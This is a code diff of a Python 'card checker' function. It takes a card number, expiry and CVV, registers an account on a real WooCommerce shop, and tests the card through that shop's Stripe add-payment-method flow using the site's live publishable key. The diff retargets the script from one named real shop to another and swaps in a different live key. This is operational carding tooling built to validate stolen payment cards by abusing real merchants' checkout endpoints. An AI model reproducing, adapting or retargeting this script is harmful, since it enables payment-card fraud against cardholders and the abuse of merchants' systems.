@@ -26,7 +26,7 @@ def full_stripe_check(cc, mm, yy, cvv):
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'accept-language': 'en-US,en;q=0.9',
         'accept-encoding': 'gzip, deflate, br',
-        'referer': 'https://www.ftelettronica.com/',
+        'referer': 'https://www.eptes.com/',
         'sec-fetch-dest': 'document',
         'sec-fetch-mode': 'navigate',
         'sec-fetch-site': 'same-origin',
@@ -38,7 +38,7 @@ def full_stripe_check(cc, mm, yy, cvv):
     try:
         # Step 1 & 2: Get login nonce
         logger.info("Step 1: Fetching login page...")
-        login_page_res = session.get('https://www.ftelettronica.com/my-account-2/', timeout=15)
+        login_page_res = session.get('https://www.eptes.com/my-account-2/', timeout=15)
         logger.info(f"Login page status: {login_page_res.status_code}")
         
         # Debug: Check if we got a valid response
@@ -74,12 +74,12 @@ def full_stripe_check(cc, mm, yy, cvv):
             '_wp_http_referer': '/my-account-2/', 
             'register': 'Register',
         }
-        reg_response = session.post('https://www.ftelettronica.com/my-account-2/', data=register_data, timeout=15)
+        reg_response = session.post('https://www.eptes.com/my-account-2/', data=register_data, timeout=15)
         logger.info(f"Registration response status: {reg_response.status_code}")
 
         # Step 4: Get payment nonce with the valid session
         logger.info("Step 3: Fetching payment method page...")
-        payment_page_res = session.get('https://www.ftelettronica.com/my-account-2/add-payment-method/', timeout=15)
+        payment_page_res = session.get('https://www.eptes.com/my-account-2/add-payment-method/', timeout=15)
         logger.info(f"Payment page status: {payment_page_res.status_code}")
         
         if payment_page_res.status_code != 200:
@@ -130,7 +130,7 @@ def full_stripe_check(cc, mm, yy, cvv):
         logger.info("Step 4: Creating Stripe payment method...")
         stripe_data = (
             f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
-            '&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
+            '&key=pk_live_iAOnl6krzsQGcNieoEv29cT000AEEWPhfH'
         )
         stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, timeout=15)
         logger.info(f"Stripe API response status: {stripe_response.status_code}")
@@ -162,7 +162,7 @@ def full_stripe_check(cc, mm, yy, cvv):
             'action': 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_token,
             'wc-stripe-payment-type': 'card', '_ajax_nonce': ajax_nonce,
         }
-        final_response = session.post('https://www.ftelettronica.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data, timeout=15)
+        final_response = session.post('https://www.eptes.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data, timeout=15)
         logger.info(f"Final submission response status: {final_response.status_code}")
         response_json = final_response.json()
         logger.debug(f"Final response: {response_json}")
